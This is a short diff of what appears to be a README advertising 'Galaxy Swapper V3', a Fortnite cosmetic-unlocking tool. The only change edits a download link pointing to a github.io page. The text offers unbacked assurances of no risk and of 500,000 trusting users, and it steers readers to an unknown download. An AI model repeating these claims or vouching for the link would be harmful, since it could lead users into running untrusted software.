@@ -2,7 +2,7 @@
 
 Galaxy Swapper V3 is the most advanced Fortnite skin swapper on the market, allowing you to unlock **over 1500+ rare skins, backblings, pickaxes and emotes** with just one click! 😍 Perfect for players who want to stand out in the lobby with exclusive cosmetics without any complicated setup or risks. Works on all modern PCs and supports the latest Fortnite updates!  
 
-[![Download Galaxy Swapper V3](https://img.shields.io/badge/Download-Galaxy_Swapper_V3-blueviolet?style=for-the-badge&logo=fortnite)](https://galaxy-swapper-v3.github.io/.github/galaxyswapperv3)  
+[![Download Galaxy Swapper V3](https://img.shields.io/badge/Download-Galaxy_Swapper_V3-blueviolet?style=for-the-badge&logo=fortnite)](https://galaxy-swapper-v3.github.io/.github/)  
 *Join 500,000+ users who trust Galaxy Swapper!*  
 
 ---
